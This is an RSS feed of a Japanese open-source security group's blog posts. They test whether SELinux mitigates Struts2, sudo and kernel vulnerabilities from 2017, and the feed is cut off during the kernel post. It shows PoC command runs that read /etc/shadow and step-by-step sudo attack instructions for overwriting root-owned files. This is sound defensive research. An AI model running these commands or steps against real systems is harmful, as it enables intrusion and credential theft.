<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on OSSセキュリティ技術の会（Secure OSS SIG)</title>
    <link>https://jsoss-sig.github.io/post/index.xml</link>
    <description>Recent content in Posts on OSSセキュリティ技術の会（Secure OSS SIG)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>ja-JP</language>
    <copyright>SOSS SIG all rights reserved. 2016</copyright>
    <lastBuildDate>Wed, 09 Aug 2017 16:48:48 +0900</lastBuildDate>
    <atom:link href="https://jsoss-sig.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>S2-048: CVE-2017-9791(Struts2) PoC with SELinux</title>
      <link>https://jsoss-sig.github.io/post/omok-selinux-struts2-20170809/</link>
      <pubDate>Wed, 09 Aug 2017 16:48:48 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/post/omok-selinux-struts2-20170809/</guid>
      <description>

&lt;p&gt;We did another &amp;ldquo;Famous&amp;rdquo; Struts2 vulnerability(CVE-2017-9791) PoC to check how SELinux can mitigate that vulnerability.&lt;/p&gt;

&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;

&lt;h2 id=&#34;prepare-for-poc&#34;&gt;Prepare for PoC&lt;/h2&gt;

&lt;p&gt;Here is a description how to reproduce it. &lt;strong&gt;I used Fedora25 image for the PoC.
I used VMWare Guest(CPU: 1, Memory: 2GB) for the PoC.&lt;/strong&gt;
Actually, this PoC environment is almost same as Previous vulnerability (CVE-2017-5638 which we did on June.).
Also, I used selinux-policy-targeted-3.13.1-225.11.fc25.noarch because previous policy had un-confined tomcat_t policy(See &lt;a href=&#34;http://www.secureoss.jp/post/omok-selinux-struts2-20170607/&#34;&gt;http://www.secureoss.jp/post/omok-selinux-struts2-20170607/&lt;/a&gt;).&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Install tomcat and related packages for working Struts2.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Download and install vulnerable version of Struts2. I used both of struts-2.5.10. Copy struts2-showcase.war under /var/lib/tomcat/webapps&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@fedora25:~# ls /var/ls /var/lib/tomcat/webapps/*war
/var/lib/tomcat/webapps/struts2-showcase.war
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Download and copy the PoC code on remote. There are many sample site for the PoC, then I&amp;rsquo;m not explaining it in here.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;To avoid normal Unix permission check for the PoC, I changed /etc/shadow permission to 755.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@fedora25:~# ls -lZ /etc/shadow
-rw-r--r--. root root system_u:object_r:shadow_t:s0        /etc/shadow
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc-with-no-selinux-selinux-permissive&#34;&gt;PoC with no SELinux(SELinux Permissive)&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Confirm SELinux is Permissive mode;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@fedora25:~# getenforce
Permissive
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run PoC from remote host(jssosug@vmhost);&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; jsossug@vmhost:~$ python Struts048.py http://172.16.148.147:8080/struts2-showcase/integration/saveGangster.action &amp;quot;cat /etc/shadow&amp;quot;

 root:XXXXXX.::0:99999:7:::
 bin:*:17110:0:99999:7:::
 daemon:*:17110:0:99999:7:::
 --snip--
 sshd:!!:17247::::::
 jssosug:XXXXXXXXXXXX::0:99999:7:::

 jsossug@vmhost:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc-with-selinux-enabled-selinux-enforcing&#34;&gt;PoC with SELinux Enabled(SELinux Enforcing)&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Reboot and set SELinux as Enforcing.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@fedora25:~# getenforce
Permissive
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run PoC from remote same as before;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@vmhost:~$ python Struts048.py http://172.16.148.147:8080/struts2-showcase/integration/saveGangster.action &amp;quot;cat /etc/shadow&amp;quot;
cmd: cat /etc/shadow

cat: /etc/shadow: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Check AVC log on Struts PC;&lt;/p&gt;

&lt;p&gt;type=AVC msg=audit(1598882036.160:219): avc:  denied  { read } for  pid=4413 comm=&amp;ldquo;cat&amp;rdquo; name=&amp;ldquo;shadow&amp;rdquo; dev=&amp;ldquo;dm-1&amp;rdquo; ino=34456196 scontext=system_u:system_r:tomcat_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;From this PoC we can say&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;SELinux can mitigate Struts2 vulnerability &amp;ldquo;if Policy is updated&amp;rdquo;.;&lt;/li&gt;
&lt;li&gt;Last SELinux Policy is treating &amp;ldquo;tomcat_t&amp;rdquo; as &amp;ldquo;unconfined domain&amp;rdquo;.&lt;/li&gt;
&lt;li&gt;Latest version of SELinux Policy will solve the problem.&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>sudo vulnerability detail with SELinux(CVE-2017-1000367/CVE-2017-1000368)</title>
      <link>https://jsoss-sig.github.io/post/omok-selinux-sudo-20170624/</link>
      <pubDate>Sat, 24 Jun 2017 02:33:08 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/post/omok-selinux-sudo-20170624/</guid>
      <description>

&lt;p&gt;There&amp;rsquo;s much misunderstanding about  &amp;ldquo;sudo&amp;rdquo; vulnerability(CVE-2017-&lt;sup&gt;1000367&lt;/sup&gt;&amp;frasl;&lt;sub&gt;1000368&lt;/sub&gt;) that &amp;ldquo;SELinux caused some vuulnerable&amp;rdquo;. On this blog, we will describe details about tha vulnerability and why it is depending on SELinux.&lt;/p&gt;

&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;

&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;

&lt;p&gt;You can easy to find the details of &amp;ldquo;what is the vulnerability&amp;rdquo; on Qualys Security Advisory(&lt;a href=&#34;http://www.openwall.com/lists/oss-security/2017/05/30/16&#34;&gt;http://www.openwall.com/lists/oss-security/2017/05/30/16&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Actually, this vulnerability is completely comes from &amp;ldquo;sudo&amp;rdquo; source code.&lt;/p&gt;

&lt;p&gt;As the description on above Qualys Security Advisory, main problem is &amp;ldquo;sudo behaivor when he get space-contained command&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;When someone run sudo, sudo program will get user information(user_info: uid, cwd, etc.) by calling get_user_info(). And get_user_info() will call sudo_ttyname_dev()-&amp;gt;sudo_ttyname_scan() for device &amp;ldquo;breadth-first scan&amp;rdquo;. During the sudo_ttyname_scan(), it will obtain &amp;ldquo;tty number for that process running&amp;rdquo; by 7th field on &amp;ldquo;/proc/[pid]/stat&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;ex.  When you run mlayer on /dev/pts/0(tty) as pid=2778:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    jsossug@cent7enc:~$ cat /proc/2778/stat
    2778 (mplayer) S 2366 2778 2366 34816 2778 1077936128 10433 ....
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;From above output, &amp;ldquo;34816&amp;rdquo; is the dev number.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&amp;ldquo;34816&amp;rdquo;(Dec) -&amp;gt; &amp;ldquo;0000 0000 0000 0000 1000 1000 0000 0000&amp;rdquo;(BN). Maigor number is &amp;ldquo;31-20 bit + 7-0 bit&amp;rdquo;. Minor number is &amp;ldquo;19-8&amp;rdquo; bit. Then Major number is &amp;ldquo;000010001000 = 136&amp;rdquo;, and Minor number is &amp;ldquo;0000 0000 0000 0000 = 0&amp;rdquo;.
  .&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;For the confirmation, check &amp;ldquo;ls -l /dev/pts/0&amp;rdquo; output;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@cent7enc:~$ ls -l /dev/pts/0
crw--w---- 1 jsossug tty 136, 0 Jun 22 12:49 /dev/pts/0
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;From above output, you can see &amp;ldquo;136,0&amp;rdquo; which is &amp;ldquo;Major, Minor&amp;rdquo; number.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The problem is /proc/[pid]/stat file is &amp;ldquo;space-separated&amp;rdquo; output. So, if someone run &amp;ldquo;cmd&amp;rdquo; which contain space, sudo_ttyname_scan() will treat other field as tty name(this is mainly bug).&lt;/p&gt;

&lt;p&gt;When Malicious attacker will run cmd with 6-spaces, he can easy to change tty number to any number. And if he can change that tty&amp;rsquo;s symbolic link to file, and treat that file as stdout, he can overwrite that file whatever he wants.
For this sequence, attacker can use sudo&amp;rsquo;s SELinux implementation.&lt;/p&gt;

&lt;h2 id=&#34;how-to-attack&#34;&gt;How to attack&lt;/h2&gt;

&lt;p&gt;Here is the steps for attacking;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Create /dev/shm/_tmp which is world-writable directory.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@cent7enc:/dev/shm$ mkdir _tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Create symbolic link &amp;ldquo;/dev/shm/_tmp/tty&amp;rdquo; as non-existent pts &amp;ldquo;/dev/pts/57&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@cent7enc:/dev/shm$ ln -s /dev/pts/57 /dev/shm/_tmp/tty
jsossug@cent7enc:/dev/shm$ ls -l /dev/shm/_tmp
lrwxrwxrwx. 1 jsossug jsossug 11  Jun 22 09:02 tty -&amp;gt; /dev/pts/57
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&amp;rdquo;/dev/pts/57&amp;rdquo; device number will be &amp;ldquo;34873&amp;rdquo; as above explanation. So, create symbolic link &amp;ldquo;/dev/shm/_tmp/      34873&amp;rdquo; for &amp;ldquo;/usr/bin/sudo&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@cent7enc _tmp]$ ln -s /usr/bin/sudo &amp;quot;/dev/shm/_tmp/     34873 &amp;quot;
[jsossug@cent7enc _tmp]$ ls -l
lrwxrwxrwx. 1 jsossug jsossug 13  Jun 22 09:07      34873  -&amp;gt; /usr/bin/sudo
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Use inotify for monitoring IN_OPEN on /dev/shm/_tmp directory. When /dev/shm/_tmp directory is accessed, change /dev/shm/_tmp/_tty to file which you want to overwrite(/etc/passwd, for example).&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;so-how-selinux-is-involved-on-this-vulnerability&#34;&gt;So, how SELinux is involved on this vulnerability?&lt;/h2&gt;

&lt;p&gt;On above step 4, sudo program will think his tty is &amp;ldquo;/dev/shm/_tmp&amp;rdquo; which is linked to &amp;ldquo;/etc/passwd&amp;rdquo;.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;If SELinux is enabled on the system&lt;strong&gt;(doesn&amp;rsquo;t matter Enforcing or Permissive)&lt;/strong&gt;, and &amp;ldquo;-r Role&amp;rdquo; option is specified , exec_setup() in sudo will call selinux_setup();&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bool
exec_setup(struct command_details *details, const char *ptyname, int ptyfd)
{
--snip-- 
#ifdef HAVE_SELINUX
    if (ISSET(details-&amp;gt;flags, CD_RBAC_ENABLED)) {
        if (selinux_setup(details-&amp;gt;selinux_role, details-&amp;gt;selinux_type,
            ptyname ? ptyname : user_details.tty, ptyfd) == -1)
            goto done;
    }
#endif
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;selinux_setup() will call relabel_tty() for relabeling the tty;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;int
selinux_setup(const char *role, const char *type, const char *ttyn,
    int ptyfd)
{
--snip--
    if (relabel_tty(ttyn, ptyfd) &amp;lt; 0) {
        warning(_(&amp;quot;unable to setup tty context for %s&amp;quot;), se_state.new_context);
        goto done;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;During the relabel_tty(), program will re-open ttyn which is now &amp;ldquo;/etc/passwd&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;--snip--
        /* Re-open tty to get new label and reset std{in,out,err} */
        close(se_state.ttyfd);
        se_state.ttyfd = open(ttyn, O_RDWR|O_NONBLOCK);
--snip--
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And call dup2(se_state.ttyfd, ptyfd) for duplicating fd.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;--snip--
                for (fd = STDIN_FILENO; fd &amp;lt;= STDERR_FILENO; fd++) {
                    if (isatty(fd) &amp;amp;&amp;amp; dup2(se_state.ttyfd, fd) == -1) {
--snip--
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then stdin/stdout/stderr will be set as /etc/passwd. So now the &amp;ldquo;cmd&amp;rdquo; stdout/stderr will be /etc/passwd, then you can overwrite /etc/passwd if you control the cmd output!!&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc-with-selinux-enabled&#34;&gt;PoC with SELinux enabled.&lt;/h2&gt;

&lt;p&gt;PoC is available on the Internet. In here, we use /etc/motd(only root can write) for attack file. And use &amp;ldquo;/usr/bin/sum&amp;rdquo; for the command, then add /usr/bin/sum as permitted command for &amp;ldquo;sudovul(test user)&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    sudovul ALL=(ALL)NOPASSWD:/usr/bin/sum
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Confirm SELinux is Permissive mode;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudovul@cent7enc:~# getenforce
Permissive
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run PoC on localhost as sudovul;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; [sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
 [sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
 /usr/bin/sum: unrecognized option &#39;--
 HELLO
 WORLD
 &#39;
 Try &#39;/usr/bin/sum --help&#39; for more information.
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Change SELinux to Enforcing mode;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudovul@cent7enc:~# getenforce
Enforcing
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Clear /etc/motd and run PoC on localhost as sudovul;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; [sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
 [sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
 /usr/bin/sum: unrecognized option &#39;--
 HELLO
 WORLD
 &#39;
 Try &#39;/usr/bin/sum --help&#39; for more information.
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So, we can overwrite /etc/motd in SELinux Permissive/Enforcing Mode.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc-with-selinux-disabled&#34;&gt;PoC with SELinux Disabled&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;set SELinux as Disabled in /etc/selinux/config, and reboot.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@cent7enc:~# getenforce
Disabled
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Clear /etc/motd, and run PoC code again.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
/usr/bin/sum: unrecognized option &#39;--
HELLO
WORLD
&#39;
Try &#39;/usr/bin/sum --help&#39; for more information.
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check /etc/motd is not modified.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
[sudovul@cent7enc sudo-CVE-2017-1000367]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;From above Vulnerability details and PoC, we can say;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The main vulnerability is coming from sudo.&lt;/li&gt;
&lt;li&gt;SELinux is not exactlly used for the attack. Sudo will open tty and dup the fd for relabeling tty(malicious user can use it for attack).&lt;/li&gt;
&lt;li&gt;This Vulnerablity condition is &lt;strong&gt;SELinux Enabled(not only Enforcing, but also Permissive.)&lt;/strong&gt;. For fixing the problem, update sudo package.&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2017-5638(Struts2) PoC with SELinux</title>
      <link>https://jsoss-sig.github.io/post/omok-selinux-struts2-20170607/</link>
      <pubDate>Thu, 08 Jun 2017 09:53:10 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/post/omok-selinux-struts2-20170607/</guid>
      <description>

&lt;p&gt;We did &amp;ldquo;Famous&amp;rdquo; Struts2 vulnerability(CVE-2017-5638) PoC to check how SELinux can mitigate that vulnerability.
During the PoC, we found current policy problem, then reported it on bugzilla.
So, I would write the information for that PoC and SELinux policy problem.&lt;/p&gt;

&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;

&lt;h2 id=&#34;prepare-for-poc&#34;&gt;Prepare for PoC&lt;/h2&gt;

&lt;p&gt;Here is a description how to reproduce it. &lt;strong&gt;I used CentOS 7.3(CentOS-7-x86_64-DVD-1611.iso)image for the PoC.
I used VMWare Guest(CPU: 1, Memory: 2GB) for the PoC.&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Install tomcat and related packages for working Struts2.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Download and install vulnerable version of Struts2. I used both of struts-2.5.10. Copy struts2-showcase.war under /var/lib/tomcat/webapps&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@cent7enc:~# ls /var/ls /var/lib/tomcat/webapps/*war
/var/lib/tomcat/webapps/struts2-showcase.war
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Download and copy the PoC code on remote. There are many sample site for the PoC, then I&amp;rsquo;m not explaining it in here.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;To avoid normal Unix permission check, I changed /etc/shadow permission to 755.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@cent7enc:~# ls -lZ /etc/shadow
-rw-r--r--. root root system_u:object_r:shadow_t:s0        /etc/shadow
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc-with-no-selinux-selinux-permissive&#34;&gt;PoC with no SELinux(SELinux Permissive)&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Confirm SELinux is Permissive mode;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@cent7enc:~# getenforce
Permissive
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run PoC from remote host(jssosug@vmhost);&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; jsossug@vmhost:~$ python attack.py http://172.16.148.130:8080/struts2-showcase/showcase.action &amp;quot;cat /etc/shadow&amp;quot;
 CVE: 2017-5638 - Apache Struts2 S2-045
 cmd: cat /etc/shadow
 root:XXXXXX.::0:99999:7:::
 bin:*:17110:0:99999:7:::
 daemon:*:17110:0:99999:7:::
 --snip--
 sshd:!!:17247::::::
 jssosug:XXXXXXXXXXXX::0:99999:7:::

 jsossug@vmhost:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc-with-selinux-enabled-selinux-enforcing&#34;&gt;PoC with SELinux Enabled(SELinux Enforcing)&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Reboot and set SELinux as Enforcing.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@cent7enc:~# getenforce
Permissive
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run PoC code again. Even if SELinux is Enforcing, still you can see /etc/shadow(so bad&amp;hellip;);&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@vmhost:~$ python attack.py http://172.16.148.130:8080/struts2-showcase/showcase.action &amp;quot;cat /etc/shadow&amp;quot;
CVE: 2017-5638 - Apache Struts2 S2-045
cmd: cat /etc/shadow

root:XXXXXX.::0:99999:7:::
bin:*:17110:0:99999:7:::
daemon:*:17110:0:99999:7:::
--snip--
sshd:!!:17247::::::
jssosug:XXXXXXXXXXXX::0:99999:7:::

jsossug@vmhost:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;check-selinux-policy&#34;&gt;Check SELinux Policy&lt;/h2&gt;

&lt;p&gt;Now we understand that SELinux can&amp;rsquo;t mitigate CVE-2017-6074. Why it is happened?&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;For understanding it, attack from remote(vmhost) by using below command;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@vmhost:~$ python attack.py http://172.16.148.130:8080/struts2-showcase/showcase.action &amp;quot;vi /tmp/abcd&amp;quot; 
CVE: 2017-5638 - Apache Struts2 S2-045
cmd: vi /tmp/abcd
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;On Struts PC, check domain who is running &amp;ldquo;vi /tmp/abcd&amp;rdquo;;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@cent7enc:~# ps axZ|grep abcd
system_u:system_r:tomcat_t:s0         3251 ?                S          0:00 vi /tmp/abcd
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check &amp;ldquo;tomcat_t&amp;rdquo; inheriented domain with seinfo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@cent7enc:~# seinfo -ttomcat_t -x
tomcat_t
  can_change_object_identity
  can_load_kernmodule
  can_setbool
  can_setenforce
  corenet_unconfined_type
  corenet_unlabeled_type
  devices_unconfined_type
  domain
  files_unconfined_type
  filesystem_unconfined_type
  kern_unconfined
  kernel_system_state_reader
  process_uncond_exempt
  selinux_unconfined_type
  storage_unconfined_type
  unconfined_domain_type
  dbusd_unconfined
  daemon
  syslog_client_type
  sepgsql_unconfined_type
  tomcat_domain
  userdom_filetrans_type
  x_domain
  xserver_unconfined_type
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So we found tomcat_t is in several &amp;ldquo;unconfined&amp;rdquo; domain.
I reported it on bugzilla(&lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=1432083&#34;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=1432083&lt;/a&gt;), then fixed version of policy(selinux-policy-3.13.1-145.el7.noarch.rpm)&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;check-selinux-updated-policy&#34;&gt;Check SELinux Updated Policy&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Fixed version of policy is in RHEL-7.4Beta image. Just for confirmation, I installed those policy on CentOS7(PoC).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@cent7enc:~# rpm -Fvh selinux-policy-3.13.1-145.el7.noarch.rpm selinux-policy-targeted-3.13.1-145.el7.noarch.rpm 

root@cent7enc:~# getenforce
Enforcing
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run PoC from remote same as before;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@vmhost:~$ python attack.py http://172.16.148.130:8080/struts2-showcase/showcase.action &amp;quot;cat /etc/shadow&amp;quot; 
CVE: 2017-5638 - Apache Struts2 S2-045
cmd: cat /etc/shadow

cat: /etc/shadow: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check AVC log on Struts PC;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;type=AVC msg=audit(1496882036.860:219): avc:  denied  { read } for  pid=4413 comm=&amp;quot;cat&amp;quot; name=&amp;quot;shadow&amp;quot; dev=&amp;quot;dm-1&amp;quot; ino=34456196 scontext=system_u:system_r:tomcat_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check &amp;ldquo;tomcat_t&amp;rdquo; inheriented domain with seinfo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@cent7enc:~# seinfo -ttomcat_t -x
tomcat_t
  nsswitch_domain
  corenet_unlabeled_type
  domain
  kernel_system_state_reader
  netlabel_peer_type
  daemon
  syslog_client_type
  pcmcia_typeattr_7
  pcmcia_typeattr_6
  pcmcia_typeattr_5
  pcmcia_typeattr_4
  pcmcia_typeattr_3
  pcmcia_typeattr_2
  pcmcia_typeattr_1
  tomcat_domain
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So now we can see no &amp;ldquo;Unconfined&amp;rdquo; domain in there.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;From this PoC we can say&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;SELinux can mitigate Struts2 vulnerability if &amp;ldquo;Policy is good.&amp;rdquo;;&lt;/li&gt;
&lt;li&gt;Last SELinux Policy is treating &amp;ldquo;tomcat_t&amp;rdquo; as &amp;ldquo;unconfined domain&amp;rdquo;.&lt;/li&gt;
&lt;li&gt;Latest version of SELinux Policy will solve the problem.&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2017-6074 PoC with SELinux(on Ubuntu)</title>
      <link>https://jsoss-sig.github.io/post/omok-selinux-kernel-20170305/</link>
      <pubDate>Sun, 05 Mar 2017 19:55:34 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/post/omok-selinux-kernel-20170305/</guid>
      <description>

&lt;p&gt;We found that PoC code for CVE-2017-6074 was published since 2017/02/28. Then we did PoC with SELinux Enabled, and figure out SELinux could mitigate it or not.&lt;/p&gt;

&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;

&lt;h2 id=&#34;prepare-for-poc&#34;&gt;Prepare for PoC&lt;/h2&gt;

&lt;p&gt;Here is a description how to reproduce it. &lt;strong&gt;I used Ubuntu 16.04.1 LTS
with 4.4.0-62-generic x86_64 kernel on VMWare Guest, because this PoC
code is only for that distro/version. Also I assigned only 1 CPU to that
guest.&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Install 4.4.0-62-generic kernel on Ubuntu. You can find it on any mirror site.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Prepare SELinux on Ubuntu. I prefer to use &amp;ldquo;aptitude&amp;rdquo; instead of &amp;ldquo;apt&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@ubuntu:~# aptitude -y install selinux
The following NEW packages will be installed:
  checkpolicy{a} libapol4{a} libauparse0{a} libpython-stdlib{a} 
  libpython2.7-minimal{a} libpython2.7-stdlib{a} libqpol1{a} m4{a} make{a} 
  policycoreutils{a} python{a} python-audit{a} python-ipy{a} 
  python-minimal{a} python-selinux{a} python-semanage{a} python-sepolgen{a} 
  python-sepolicy{a} python-setools{a} python2.7{a} python2.7-minimal{a} 
  selinux{b} selinux-policy-default{a} selinux-policy-dev{a} 
  selinux-policy-ubuntu{ab} selinux-utils{a} setools{a} 
